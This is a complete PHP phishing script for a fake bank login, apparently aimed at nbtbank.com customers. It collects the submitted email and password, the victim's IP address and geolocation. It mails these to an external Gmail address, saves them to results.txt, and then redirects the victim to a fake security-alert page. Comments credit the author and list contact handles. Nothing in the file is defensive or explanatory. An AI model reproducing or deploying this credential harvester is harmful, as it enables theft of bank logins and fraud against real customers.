<?php
// THIS SCRIPT CODED BY saradauchia2
// CONTACT US SKYPE : saradauchia2
// ICQ : 746318279
	
	
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "Email: " . $_POST['username'] . "\n"; 
    $message .= "Password: " . $_POST['password'] . "\n";
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$send = "100fareedah@gmail.com";

	$subject = "nbtbank.com l $ip".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
	window.location="securealert.html";
</script>

